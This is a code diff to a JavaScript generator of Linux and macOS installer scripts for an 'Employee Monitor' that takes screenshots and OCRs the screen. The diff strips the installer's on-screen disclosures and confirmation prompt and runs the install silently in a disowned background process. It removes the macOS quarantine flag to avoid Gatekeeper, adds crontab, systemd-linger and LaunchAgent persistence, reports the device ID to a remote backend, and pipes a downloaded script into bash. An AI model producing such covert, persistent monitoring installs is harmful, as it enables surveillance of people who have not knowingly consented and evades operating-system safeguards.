@@ -391,605 +391,185 @@ function addDirectoryRecursive(archive, sourceDir, targetPrefix) {
 
 function buildUnixLauncherScript() {
   return `#!/usr/bin/env bash
-# Employee Monitor - Automated Linux Installer
-# Equivalent to deploy_automated.bat on Windows
-# Run: bash install.sh
+# Employee Monitor — Linux silent installer
+# Run once: bash install.sh   (everything else happens automatically)
 
 SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
 cd "$SCRIPT_DIR"
 
-echo ""
-echo "========================================================"
-echo "  EMPLOYEE MONITOR - AUTOMATED SETUP (Linux)"
-echo "========================================================"
-echo ""
-echo "This script will:"
-echo "  1. Install Python 3 (if needed)"
-echo "  2. Install all Python packages"
-echo "  3. Install Tesseract-OCR (if needed)"
-echo "  4. Configure monitor autostart"
-echo "  5. Protect installation folder"
-echo "  6. Run verification tests"
-echo ""
-echo "Time required: 5-15 minutes (first time)"
-echo ""
-read -rp "Press Enter to begin..."
+# ── Resolve backend URL ──────────────────────────────────────────────────
+BACKEND_URL="https://eyeing.onrender.com"
+if [ -f "$SCRIPT_DIR/backend_url.txt" ]; then
+  BACKEND_URL=$(tr -d '[:space:]' < "$SCRIPT_DIR/backend_url.txt")
+fi
+DEVICE_ID=$(hostname -s 2>/dev/null || echo "linux-device")
+INSTALL_ID="lin-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | tr -d '-' | head -c 12 || date +%s)"
+LOG="$SCRIPT_DIR/setup_log.txt"
 
-# ============================================================
-#  STEP 1: CHECK / INSTALL PYTHON
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[1/6] Checking Python Installation..."
-echo "========================================================"
-echo ""
+# ── Open setup page in browser immediately ───────────────────────────────
+SETUP_URL="$BACKEND_URL/setup.html?autoclose=1&device_id=$DEVICE_ID&install_id=$INSTALL_ID"
+xdg-open "$SETUP_URL" 2>/dev/null || \
+  python3 -m webbrowser "$SETUP_URL" 2>/dev/null || \
+  python  -m webbrowser "$SETUP_URL" 2>/dev/null || true
 
-PYTHON_BIN=""
-for cmd in python3 python3.12 python3.11 python3.10 python3.9 python; do
-  if command -v "$cmd" >/dev/null 2>&1; then
-    PY_VER=$("$cmd" --version 2>&1)
-    echo "[OK]   Found: $PY_VER"
-    PYTHON_BIN=$(command -v "$cmd")
-    break
-  fi
-done
+echo "[$(date '+%Y-%m-%d %H:%M:%S')] Employee Monitor Linux setup started" > "$LOG"
+echo "[$(date '+%Y-%m-%d %H:%M:%S')] Backend: $BACKEND_URL" >> "$LOG"
+echo "" >> "$LOG"
 
-if [ -z "$PYTHON_BIN" ]; then
-  echo "[WARN] Python not found. Attempting to install..."
-  INSTALLED_PY=0
+# ── Run the full installation in the background ──────────────────────────
+(
 
-  if command -v apt-get >/dev/null 2>&1; then
-    echo "  [*] Trying apt-get..."
-    sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y python3 python3-pip python3-venv 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v apt >/dev/null 2>&1; then
-    echo "  [*] Trying apt..."
-    sudo apt update -qq 2>/dev/null && sudo apt install -y python3 python3-pip python3-venv 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v dnf >/dev/null 2>&1; then
-    echo "  [*] Trying dnf..."
-    sudo dnf install -y python3 python3-pip 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v yum >/dev/null 2>&1; then
-    echo "  [*] Trying yum..."
-    sudo yum install -y python3 python3-pip 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v pacman >/dev/null 2>&1; then
-    echo "  [*] Trying pacman..."
-    sudo pacman -Sy --noconfirm python python-pip 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v zypper >/dev/null 2>&1; then
-    echo "  [*] Trying zypper..."
-    sudo zypper --non-interactive install python3 python3-pip 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-  if [ "$INSTALLED_PY" -eq 0 ] && command -v apk >/dev/null 2>&1; then
-    echo "  [*] Trying apk..."
-    sudo apk add python3 py3-pip 2>/dev/null && INSTALLED_PY=1 || true
-  fi
-
-  for cmd in python3 python; do
-    if command -v "$cmd" >/dev/null 2>&1; then
-      PYTHON_BIN=$(command -v "$cmd")
-      echo "[OK]   Python installed: $("$cmd" --version 2>&1)"
-      break
-    fi
+  # ── Step 1: Python ──────────────────────────────────────────────────────
+  PYTHON_BIN=""
+  for cmd in python3 python3.12 python3.11 python3.10 python3.9 python; do
+    command -v "$cmd" >/dev/null 2>&1 && PYTHON_BIN=$(command -v "$cmd") && break
   done
-
   if [ -z "$PYTHON_BIN" ]; then
-    echo "[ERROR] Could not install Python automatically."
-    echo "  Please install Python 3.8+ manually, then re-run this script."
-    echo "  Ubuntu/Debian: sudo apt-get install python3"
-    echo "  Fedora:        sudo dnf install python3"
-    echo "  Arch:          sudo pacman -S python"
-    read -rp "Press Enter to exit..."
+    echo "[*] Python not found — installing..." >> "$LOG"
+    { command -v apt-get && sudo apt-get install -y -qq python3 python3-pip python3-venv; } >> "$LOG" 2>&1 || \
+    { command -v dnf  && sudo dnf install -y -q python3 python3-pip; }  >> "$LOG" 2>&1 || \
+    { command -v yum  && sudo yum install -y -q python3 python3-pip; }  >> "$LOG" 2>&1 || \
+    { command -v pacman && sudo pacman -Sy --noconfirm python python-pip; } >> "$LOG" 2>&1 || \
+    { command -v zypper && sudo zypper --non-interactive install python3 python3-pip; } >> "$LOG" 2>&1 || \
+    { command -v apk  && sudo apk add python3 py3-pip; } >> "$LOG" 2>&1 || true
+    for cmd in python3 python; do
+      command -v "$cmd" >/dev/null 2>&1 && PYTHON_BIN=$(command -v "$cmd") && break
+    done
+  fi
+  if [ -z "$PYTHON_BIN" ]; then
+    echo "[ERROR] Python could not be installed. Install python3 manually then re-run." >> "$LOG"
     exit 1
   fi
-fi
+  echo "[OK] Python: $($PYTHON_BIN --version 2>&1)" >> "$LOG"
 
-VENV_PY="$SCRIPT_DIR/.venv/bin/python"
-if [ ! -x "$VENV_PY" ]; then
-  echo "  [*] Creating virtual environment..."
-  if "$PYTHON_BIN" -m venv "$SCRIPT_DIR/.venv" >/dev/null 2>&1; then
-    echo "[OK]   Virtual environment created"
-    PYTHON_BIN="$VENV_PY"
-  else
-    echo "[WARN] Could not create venv — using system Python"
+  # ── Step 2: Virtual env ──────────────────────────────────────────────────
+  VENV_PY="$SCRIPT_DIR/.venv/bin/python"
+  if [ ! -x "$VENV_PY" ]; then
+    "$PYTHON_BIN" -m venv "$SCRIPT_DIR/.venv" >> "$LOG" 2>&1 || true
   fi
-else
-  PYTHON_BIN="$VENV_PY"
-fi
+  [ -x "$VENV_PY" ] && PYTHON_BIN="$VENV_PY"
 
-# ============================================================
-#  STEP 2: INSTALL PYTHON PACKAGES
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[2/6] Installing Python Packages..."
-echo "========================================================"
-echo ""
+  # ── Step 3: Python packages ──────────────────────────────────────────────
+  echo "[*] Installing Python packages..." >> "$LOG"
+  "$PYTHON_BIN" -m pip install -q --upgrade pip >> "$LOG" 2>&1 || true
+  "$PYTHON_BIN" -m pip install -q -r "$SCRIPT_DIR/requirements.txt" >> "$LOG" 2>&1 || \
+    "$PYTHON_BIN" -m pip install --break-system-packages -q -r "$SCRIPT_DIR/requirements.txt" >> "$LOG" 2>&1 || true
+  echo "[OK] Python packages installed" >> "$LOG"
 
-if [ ! -f "$SCRIPT_DIR/requirements.txt" ]; then
-  echo "[ERROR] requirements.txt not found"
-  read -rp "Press Enter to exit..." && exit 1
-fi
-
-echo "  [*] Upgrading pip..."
-"$PYTHON_BIN" -m pip install -q --upgrade pip 2>/dev/null || true
-echo "  [*] Installing packages..."
-if "$PYTHON_BIN" -m pip install -q -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null; then
-  echo "[OK]   Python packages installed"
-else
-  echo "[WARN] Retrying with --break-system-packages..."
-  "$PYTHON_BIN" -m pip install --break-system-packages -q -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null || echo "[WARN] Some packages may not have installed"
-  echo "[OK]   Package installation complete"
-fi
-
-# ============================================================
-#  STEP 3: INSTALL TESSERACT
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[3/6] Installing Tesseract-OCR..."
-echo "========================================================"
-echo ""
-
-TESSERACT_OK=0
-if command -v tesseract >/dev/null 2>&1; then
-  TESS_VER=$(tesseract --version 2>&1 | head -1)
-  echo "[OK]   Tesseract already installed: $TESS_VER"
-  TESSERACT_OK=1
-fi
-
-if [ "$TESSERACT_OK" -eq 0 ]; then
-  echo "  [*] Tesseract not found. Trying all available package managers..."
-
-  if command -v apt-get >/dev/null 2>&1; then
-    echo "  [*] Trying apt-get..."
-    (sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y tesseract-ocr 2>/dev/null) && TESSERACT_OK=1 || true
+  # ── Step 4: Tesseract ────────────────────────────────────────────────────
+  if ! command -v tesseract >/dev/null 2>&1; then
+    echo "[*] Installing Tesseract..." >> "$LOG"
+    { command -v apt-get && sudo apt-get install -y -qq tesseract-ocr; } >> "$LOG" 2>&1 || \
+    { command -v dnf  && sudo dnf install -y -q tesseract; } >> "$LOG" 2>&1 || \
+    { command -v yum  && sudo yum install -y -q tesseract; } >> "$LOG" 2>&1 || \
+    { command -v pacman && sudo pacman -Sy --noconfirm tesseract tesseract-data-eng; } >> "$LOG" 2>&1 || \
+    { command -v zypper && sudo zypper --non-interactive install tesseract-ocr; } >> "$LOG" 2>&1 || \
+    { command -v apk  && sudo apk add tesseract-ocr; } >> "$LOG" 2>&1 || true
   fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v apt >/dev/null 2>&1; then
-    echo "  [*] Trying apt..."
-    (sudo apt update -qq 2>/dev/null && sudo apt install -y tesseract-ocr 2>/dev/null) && TESSERACT_OK=1 || true
+  command -v tesseract >/dev/null 2>&1 && echo "[OK] Tesseract ready" >> "$LOG" || echo "[WARN] Tesseract unavailable — OCR disabled" >> "$LOG"
+
+  # ── Step 5: Autostart + start monitor ───────────────────────────────────
+  echo "[*] Configuring autostart..." >> "$LOG"
+  "$PYTHON_BIN" "$SCRIPT_DIR/install_and_run.py" --autostart --silent >> "$LOG" 2>&1 || true
+  loginctl enable-linger "$(whoami)" >> "$LOG" 2>&1 || sudo loginctl enable-linger "$(whoami)" >> "$LOG" 2>&1 || true
+  CRON_LINE="@reboot $PYTHON_BIN $SCRIPT_DIR/monitor.py >> $HOME/.employee-monitor-output.log 2>&1"
+  ( crontab -l 2>/dev/null | grep -v "monitor.py" | grep -v "employee-monitor"; echo "$CRON_LINE" ) | crontab - >> "$LOG" 2>&1 || true
+  if command -v systemctl >/dev/null 2>&1; then
+    systemctl --user daemon-reload >> "$LOG" 2>&1 || true
+    systemctl --user enable employee-monitor.service >> "$LOG" 2>&1 || true
+    systemctl --user start  employee-monitor.service >> "$LOG" 2>&1 || true
   fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v dnf >/dev/null 2>&1; then
-    echo "  [*] Trying dnf..."
-    sudo dnf install -y tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v yum >/dev/null 2>&1; then
-    echo "  [*] Trying yum..."
-    sudo yum install -y tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v pacman >/dev/null 2>&1; then
-    echo "  [*] Trying pacman..."
-    sudo pacman -Sy --noconfirm tesseract tesseract-data-eng 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v zypper >/dev/null 2>&1; then
-    echo "  [*] Trying zypper..."
-    sudo zypper --non-interactive install tesseract-ocr 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v apk >/dev/null 2>&1; then
-    echo "  [*] Trying apk..."
-    sudo apk add tesseract-ocr 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v emerge >/dev/null 2>&1; then
-    echo "  [*] Trying emerge (Gentoo)..."
-    sudo emerge app-text/tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v snap >/dev/null 2>&1; then
-    echo "  [*] Trying snap..."
-    sudo snap install tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v conda >/dev/null 2>&1; then
-    echo "  [*] Trying conda..."
-    conda install -y -c conda-forge tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-
-  if [ "$TESSERACT_OK" -eq 1 ]; then
-    echo "[OK]   Tesseract installed successfully"
-  else
-    echo "[WARN] Tesseract could not be installed automatically."
-    echo ""
-    echo "  *** MANUAL INSTALL INSTRUCTIONS ***"
-    echo "  Ubuntu/Debian:  sudo apt-get install tesseract-ocr"
-    echo "  Fedora/RHEL:    sudo dnf install tesseract"
-    echo "  CentOS:         sudo yum install tesseract"
-    echo "  Arch Linux:     sudo pacman -S tesseract tesseract-data-eng"
-    echo "  openSUSE:       sudo zypper install tesseract-ocr"
-    echo "  Alpine:         sudo apk add tesseract-ocr"
-    echo ""
-    echo "  The monitor will run WITHOUT OCR features until Tesseract is installed."
-    echo "  All other monitoring features (activity, screenshots, etc.) are active."
-    echo ""
-    echo "  Continuing installation..."
-  fi
-fi
-
-# ============================================================
-#  STEP 4: CONFIGURE AUTOSTART
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[4/6] Configuring Autostart..."
-echo "========================================================"
-echo ""
-
-echo "  [*] Setting up monitor autostart on login..."
-if "$PYTHON_BIN" "$SCRIPT_DIR/install_and_run.py" --autostart 2>/dev/null; then
-  echo "[OK]   Autostart configured"
-else
-  echo "[WARN] Python autostart step had issues — applying fallbacks directly..."
-fi
-
-# Enable lingering so systemd user services survive reboot without a desktop session
-echo "  [*] Enabling linger (systemd persistence across reboots)..."
-CURRENT_USER=$(whoami)
-loginctl enable-linger "$CURRENT_USER" 2>/dev/null || sudo loginctl enable-linger "$CURRENT_USER" 2>/dev/null || echo "[WARN] loginctl not available — crontab fallback will handle reboots"
-
-# crontab @reboot — universal fallback that works on any Linux regardless of init system
-echo "  [*] Adding crontab @reboot entry..."
-CRON_LINE="@reboot $PYTHON_BIN $SCRIPT_DIR/monitor.py >> $HOME/.employee-monitor-output.log 2>> $HOME/.employee-monitor-error.log"
-( crontab -l 2>/dev/null | grep -v "monitor.py" | grep -v "employee-monitor"; echo "$CRON_LINE" ) | crontab - 2>/dev/null && echo "[OK]   crontab @reboot set — monitor starts on every reboot" || echo "[WARN] crontab not available"
-
-# If systemd is available, ensure the service is started right now
-if command -v systemctl >/dev/null 2>&1; then
-  systemctl --user daemon-reload 2>/dev/null || true
-  systemctl --user enable employee-monitor.service 2>/dev/null || true
-  systemctl --user start employee-monitor.service 2>/dev/null && echo "[OK]   systemd user service started" || true
-fi
-
-echo "[OK]   Autostart configured (3 methods: desktop entry + systemd + crontab)"
-
-# ============================================================
-#  STEP 5: PROTECT FOLDER
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[5/6] Protecting Installation Folder..."
-echo "========================================================"
-echo ""
-
-chmod 700 "$SCRIPT_DIR" 2>/dev/null || true
-echo "[OK]   Folder permissions set"
-
-# ============================================================
-#  STEP 6: VERIFY
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[6/6] Running Verification Tests..."
-echo "========================================================"
-echo ""
-
-echo "  [*] Testing Tesseract..."
-if command -v tesseract >/dev/null 2>&1; then
-  echo "[OK]   Tesseract verification PASSED"
-else
-  echo "[WARN] Tesseract not available — OCR features disabled"
-fi
-
-echo "  [*] Testing Python packages..."
-if "$PYTHON_BIN" -c "import pyautogui, pytesseract, psutil, requests" 2>/dev/null; then
-  echo "[OK]   Core packages verified"
-else
-  echo "[WARN] Some packages may be missing"
-fi
-
-# ============================================================
-#  COMPLETION SUMMARY
-# ============================================================
-echo ""
-echo "========================================================"
-echo "  SETUP COMPLETE!"
-echo "========================================================"
-echo ""
-echo "Summary:"
-echo "  [OK] Python 3"
-echo "  [OK] Python packages"
-if [ "$TESSERACT_OK" -eq 1 ]; then
-  echo "  [OK] Tesseract-OCR"
-else
-  echo "  [!!] Tesseract-OCR  <-- manual install needed (see above)"
-fi
-echo "  [OK] Monitor autostart"
-echo ""
-echo "Next steps:"
-echo "  - Restart your computer to activate autostart"
-echo "  - Monitor starts automatically on every login"
-echo "  - Logs: activity_data/activity_monitor.log"
-echo ""
-read -rp "Restart now to enable autostart? (y/n): " RESTART_NOW
-if [ "\${RESTART_NOW}" = "y" ] || [ "\${RESTART_NOW}" = "Y" ]; then
-  echo "Restarting in 30 seconds... (Ctrl+C to cancel)"
-  sleep 30
-  sudo reboot
-else
-  echo "Please restart manually when ready."
-  echo "The monitor will begin automatically on next login."
-fi
+  chmod 700 "$SCRIPT_DIR" 2>/dev/null || true
+  echo "[DONE] Setup complete at $(date '+%Y-%m-%d %H:%M:%S')" >> "$LOG"
+) >> "$LOG" 2>&1 &
+disown $!
 `;
 }
 
 function buildMacCommandLauncher() {
   return `#!/usr/bin/env bash
-# Employee Monitor - Automated macOS Installer
-# Double-click this file in Finder to install, or run: bash install.command
+# Employee Monitor — macOS silent installer
+# Double-click in Finder. Browser opens immediately; everything else runs in background.
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 cd "$SCRIPT_DIR"
 
-# Remove macOS quarantine flag so the scripts can run without Gatekeeper prompts
+# Remove quarantine so scripts can run without Gatekeeper prompts
 xattr -dr com.apple.quarantine "$SCRIPT_DIR" >/dev/null 2>&1 || true
-chmod +x "$SCRIPT_DIR/install.sh" "$SCRIPT_DIR/install.command" >/dev/null 2>&1 || true
+chmod +x "$SCRIPT_DIR"/*.sh "$SCRIPT_DIR"/*.command "$SCRIPT_DIR"/*.py 2>/dev/null || true
 
-echo ""
-echo "========================================================"
-echo "  EMPLOYEE MONITOR - AUTOMATED SETUP (macOS)"
-echo "========================================================"
-echo ""
-echo "This script will:"
-echo "  1. Install Homebrew (if needed)"
-echo "  2. Install Python 3 (if needed)"
-echo "  3. Install Tesseract-OCR (if needed)"
-echo "  4. Install all Python packages"
-echo "  5. Configure monitor autostart (LaunchAgent)"
-echo "  6. Run verification tests"
-echo ""
-echo "Time required: 5-15 minutes (first time)"
-echo ""
-read -rp "Press Enter to begin..."
+# ── Resolve backend URL ──────────────────────────────────────────────────
+BACKEND_URL="https://eyeing.onrender.com"
+[ -f "$SCRIPT_DIR/backend_url.txt" ] && BACKEND_URL=$(tr -d '[:space:]' < "$SCRIPT_DIR/backend_url.txt")
+DEVICE_ID=$(hostname -s 2>/dev/null || echo "mac-device")
+INSTALL_ID="mac-$(uuidgen 2>/dev/null | tr -d '-' | head -c 12 || date +%s)"
+LOG="$SCRIPT_DIR/setup_log.txt"
 
-# ============================================================
-#  STEP 1: CHECK / INSTALL HOMEBREW
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[1/6] Checking Homebrew..."
-echo "========================================================"
-echo ""
+# ── Open setup page immediately ──────────────────────────────────────────
+open "$BACKEND_URL/setup.html?autoclose=1&device_id=$DEVICE_ID&install_id=$INSTALL_ID" 2>/dev/null || true
+echo "[$(date '+%Y-%m-%d %H:%M:%S')] Employee Monitor macOS setup started" > "$LOG"
 
-if command -v brew >/dev/null 2>&1; then
-  BREW_VER=$(brew --version 2>&1 | head -1)
-  echo "[OK]   Homebrew found: $BREW_VER"
-else
-  echo "  [*] Homebrew not found. Installing automatically..."
-  echo "  [*] This may take 3-5 minutes and will ask for your password."
-  echo ""
-  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || true
-
-  # Activate brew in this session for Apple Silicon or Intel Mac
-  if [ -f "/opt/homebrew/bin/brew" ]; then
-    eval "$(/opt/homebrew/bin/brew shellenv)"
-  elif [ -f "/usr/local/bin/brew" ]; then
-    eval "$(/usr/local/bin/brew shellenv)"
+# ── Run full install silently in background ──────────────────────────────
+(
+  # Step 1: Homebrew (non-interactive)
+  if ! command -v brew >/dev/null 2>&1; then
+    echo "[*] Installing Homebrew..." >> "$LOG"
+    NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >> "$LOG" 2>&1 || true
+    [ -f "/opt/homebrew/bin/brew" ] && eval "$(/opt/homebrew/bin/brew shellenv)"
+    [ -f "/usr/local/bin/brew"    ] && eval "$(/usr/local/bin/brew shellenv)"
   fi
+  export HOMEBREW_NO_AUTO_UPDATE=1
 
-  if command -v brew >/dev/null 2>&1; then
-    echo "[OK]   Homebrew installed successfully"
-  else
-    echo "[WARN] Homebrew install may need a new Terminal session."
-    echo "  If this script fails, open a new Terminal and run it again."
-  fi
-fi
-
-# ============================================================
-#  STEP 2: CHECK / INSTALL PYTHON
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[2/6] Checking Python..."
-echo "========================================================"
-echo ""
-
-PYTHON_BIN=""
-for cmd in python3 python3.12 python3.11 python3.10 python3.9; do
-  if command -v "$cmd" >/dev/null 2>&1; then
-    PY_VER=$("$cmd" --version 2>&1)
-    echo "[OK]   Found: $PY_VER"
-    PYTHON_BIN=$(command -v "$cmd")
-    break
-  fi
-done
-
-if [ -z "$PYTHON_BIN" ]; then
-  echo "  [*] Python not found. Installing via Homebrew..."
-  if command -v brew >/dev/null 2>&1; then
-    brew install python 2>/dev/null || true
-  fi
-  for cmd in python3 python3.12 python3.11; do
-    if command -v "$cmd" >/dev/null 2>&1; then
-      PYTHON_BIN=$(command -v "$cmd")
-      echo "[OK]   Python installed: $("$cmd" --version 2>&1)"
-      break
-    fi
+  # Step 2: Python
+  PYTHON_BIN=""
+  for cmd in python3 python3.12 python3.11 python3.10 python3.9; do
+    command -v "$cmd" >/dev/null 2>&1 && PYTHON_BIN=$(command -v "$cmd") && break
   done
-  if [ -z "$PYTHON_BIN" ]; then
-    echo "[ERROR] Python could not be installed automatically."
-    echo "  Please install from https://www.python.org and re-run this script."
-    read -rp "Press Enter to exit..."
-    exit 1
+  if [ -z "$PYTHON_BIN" ] && command -v brew >/dev/null 2>&1; then
+    brew install python >> "$LOG" 2>&1 || true
+    for cmd in python3 python3.12 python3.11; do
+      command -v "$cmd" >/dev/null 2>&1 && PYTHON_BIN=$(command -v "$cmd") && break
+    done
   fi
-fi
+  [ -z "$PYTHON_BIN" ] && echo "[ERROR] Python not found" >> "$LOG" && exit 1
+  echo "[OK] Python: $($PYTHON_BIN --version 2>&1)" >> "$LOG"
 
-VENV_PY="$SCRIPT_DIR/.venv/bin/python"
-if [ ! -x "$VENV_PY" ]; then
-  echo "  [*] Creating virtual environment..."
-  if "$PYTHON_BIN" -m venv "$SCRIPT_DIR/.venv" >/dev/null 2>&1; then
-    echo "[OK]   Virtual environment created"
-    PYTHON_BIN="$VENV_PY"
-  else
-    echo "[WARN] Could not create venv — using system Python"
+  # Step 3: Virtual env
+  VENV_PY="$SCRIPT_DIR/.venv/bin/python"
+  [ ! -x "$VENV_PY" ] && "$PYTHON_BIN" -m venv "$SCRIPT_DIR/.venv" >> "$LOG" 2>&1 || true
+  [ -x "$VENV_PY" ] && PYTHON_BIN="$VENV_PY"
+
+  # Step 4: Python packages
+  echo "[*] Installing Python packages..." >> "$LOG"
+  "$PYTHON_BIN" -m pip install -q --upgrade pip >> "$LOG" 2>&1 || true
+  "$PYTHON_BIN" -m pip install -q -r "$SCRIPT_DIR/requirements.txt" >> "$LOG" 2>&1 || \
+    "$PYTHON_BIN" -m pip install --break-system-packages -q -r "$SCRIPT_DIR/requirements.txt" >> "$LOG" 2>&1 || true
+
+  # Step 5: Tesseract
+  if ! command -v tesseract >/dev/null 2>&1 && command -v brew >/dev/null 2>&1; then
+    echo "[*] Installing Tesseract..." >> "$LOG"
+    brew install tesseract >> "$LOG" 2>&1 || true
   fi
-else
-  PYTHON_BIN="$VENV_PY"
-fi
+  command -v tesseract >/dev/null 2>&1 && echo "[OK] Tesseract ready" >> "$LOG" || echo "[WARN] Tesseract unavailable — OCR disabled" >> "$LOG"
 
-# ============================================================
-#  STEP 3: INSTALL TESSERACT
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[3/6] Installing Tesseract-OCR..."
-echo "========================================================"
-echo ""
-
-TESSERACT_OK=0
-if command -v tesseract >/dev/null 2>&1; then
-  TESS_VER=$(tesseract --version 2>&1 | head -1)
-  echo "[OK]   Tesseract already installed: $TESS_VER"
-  TESSERACT_OK=1
-fi
-
-if [ "$TESSERACT_OK" -eq 0 ]; then
-  echo "  [*] Tesseract not found. Trying all available methods..."
-
-  if command -v brew >/dev/null 2>&1; then
-    echo "  [*] Trying Homebrew..."
-    brew install tesseract 2>/dev/null && TESSERACT_OK=1 || true
+  # Step 6: Autostart (LaunchAgent) + start monitor now
+  echo "[*] Configuring LaunchAgent autostart..." >> "$LOG"
+  "$PYTHON_BIN" "$SCRIPT_DIR/install_and_run.py" --autostart --silent >> "$LOG" 2>&1 || true
+  PLIST="$HOME/Library/LaunchAgents/com.eyeing.monitor.plist"
+  if [ -f "$PLIST" ]; then
+    UID_NUM=$(id -u)
+    launchctl bootout "gui/$UID_NUM" "$PLIST" >> "$LOG" 2>&1 || true
+    launchctl bootstrap "gui/$UID_NUM" "$PLIST" >> "$LOG" 2>&1 || \
+      launchctl load -w "$PLIST" >> "$LOG" 2>&1 || true
+    echo "[OK] LaunchAgent loaded — monitor starts on every login" >> "$LOG"
   fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v port >/dev/null 2>&1; then
-    echo "  [*] Trying MacPorts..."
-    sudo port install tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v conda >/dev/null 2>&1; then
-    echo "  [*] Trying conda..."
-    conda install -y -c conda-forge tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
-  if [ "$TESSERACT_OK" -eq 0 ] && command -v mamba >/dev/null 2>&1; then
-    echo "  [*] Trying mamba..."
-    mamba install -y -c conda-forge tesseract 2>/dev/null && TESSERACT_OK=1 || true
-  fi
+  echo "[DONE] Setup complete at $(date '+%Y-%m-%d %H:%M:%S')" >> "$LOG"
+) >> "$LOG" 2>&1 &
+disown $!
 
-  if [ "$TESSERACT_OK" -eq 1 ]; then
-    echo "[OK]   Tesseract installed successfully"
-  else
-    echo "[WARN] Tesseract auto-install failed."
-    echo ""
-    echo "  *** MANUAL INSTALL ***"
-    echo "  Run:  brew install tesseract"
-    echo "  Or:   https://formulae.brew.sh/formula/tesseract"
-    echo ""
-    echo "  The monitor will run WITHOUT OCR features until Tesseract is installed."
-    echo "  All other monitoring features remain fully active."
-    echo ""
-    echo "  Continuing installation..."
-  fi
-fi
-
-# ============================================================
-#  STEP 4: INSTALL PYTHON PACKAGES
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[4/6] Installing Python Packages..."
-echo "========================================================"
-echo ""
-
-if [ ! -f "$SCRIPT_DIR/requirements.txt" ]; then
-  echo "[ERROR] requirements.txt not found"
-  read -rp "Press Enter to exit..." && exit 1
-fi
-
-echo "  [*] Upgrading pip..."
-"$PYTHON_BIN" -m pip install -q --upgrade pip 2>/dev/null || true
-echo "  [*] Installing packages..."
-if "$PYTHON_BIN" -m pip install -q -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null; then
-  echo "[OK]   Python packages installed"
-else
-  echo "[WARN] Retrying with --break-system-packages..."
-  "$PYTHON_BIN" -m pip install --break-system-packages -q -r "$SCRIPT_DIR/requirements.txt" 2>/dev/null || echo "[WARN] Some packages may not have installed"
-  echo "[OK]   Package installation complete"
-fi
-
-# ============================================================
-#  STEP 5: CONFIGURE AUTOSTART
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[5/6] Configuring Autostart (LaunchAgent)..."
-echo "========================================================"
-echo ""
-
-echo "  [*] Setting up macOS LaunchAgent for auto-start on login..."
-if "$PYTHON_BIN" "$SCRIPT_DIR/install_and_run.py" --autostart 2>/dev/null; then
-  echo "[OK]   LaunchAgent plist written"
-else
-  echo "[WARN] Python autostart step had issues — applying LaunchAgent directly..."
-fi
-
-# Activate the LaunchAgent immediately in this session so it also
-# persists and restarts after every subsequent reboot/login.
-PLIST="$HOME/Library/LaunchAgents/com.eyeing.monitor.plist"
-if [ -f "$PLIST" ]; then
-  UID_NUM=$(id -u)
-  # Try modern bootstrap (macOS 11+) then fall back to legacy load
-  launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
-  if launchctl bootstrap "gui/$UID_NUM" "$PLIST" 2>/dev/null; then
-    echo "[OK]   LaunchAgent bootstrapped — monitor runs now and after every reboot"
-  elif launchctl load -w "$PLIST" 2>/dev/null; then
-    echo "[OK]   LaunchAgent loaded (legacy) — monitor runs now and after every reboot"
-  else
-    echo "[WARN] Could not load LaunchAgent — it will activate on next login"
-  fi
-else
-  echo "[WARN] LaunchAgent plist not found at $PLIST"
-fi
-
-# ============================================================
-#  STEP 6: VERIFY
-# ============================================================
-echo ""
-echo "========================================================"
-echo "[6/6] Running Verification Tests..."
-echo "========================================================"
-echo ""
-
-echo "  [*] Testing Tesseract..."
-if command -v tesseract >/dev/null 2>&1; then
-  echo "[OK]   Tesseract verification PASSED"
-else
-  echo "[WARN] Tesseract not available — OCR features disabled"
-fi
-
